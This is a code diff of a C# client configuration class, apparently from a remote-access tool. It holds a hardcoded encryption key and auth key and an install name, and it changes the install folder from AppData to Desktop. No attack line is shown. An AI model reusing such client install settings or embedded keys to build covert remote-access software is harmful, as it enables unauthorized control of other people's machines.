@@ -15,7 +15,7 @@ namespace xClient.Config
         public static int RECONNECTDELAY = 500;
         public static string KEY = "1WvgEMPjdwfqIMeM9MclyQ==";
         public static string AUTHKEY = "NcFtjbDOcsw7Evd3coMC0y4koy/SRZGydhNmno81ZOWOvdfg7sv0Cj5ad2ROUfX4QMscAIjYJdjrrs41+qcQwg==";
-        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
+        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.Desktop;
         public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
         public static string SUBDIRECTORY = "Test";
         public static string INSTALLNAME = "test.exe";
@@ -41,7 +41,8 @@ namespace xClient.Config
         public static int RECONNECTDELAY = 5000;
         public static string KEY = "";
         public static string AUTHKEY = "";
-        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
+        //public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.Desktop;
+        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.Desktop;
         public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
         public static string SUBDIRECTORY = "";
         public static string INSTALLNAME = "";
@@ -82,10 +83,15 @@ namespace xClient.Config
             switch (SPECIALFOLDER)
             {
                 case Environment.SpecialFolder.ProgramFilesX86:
-                    SPECIALFOLDER = Environment.SpecialFolder.ProgramFiles;
+                    SPECIALFOLDER = Environment.SpecialFolder.DesktopDirectory;
+                    //SPECIALFOLDER = Environment.SpecialFolder.ProgramFiles;
                     break;
                 case Environment.SpecialFolder.SystemX86:
-                    SPECIALFOLDER = Environment.SpecialFolder.System;
+                    SPECIALFOLDER = Environment.SpecialFolder.DesktopDirectory;
+                    //SPECIALFOLDER = Environment.SpecialFolder.System;
+                    break;
+                default:
+                    SPECIALFOLDER = Environment.SpecialFolder.DesktopDirectory;
                     break;
             }
 
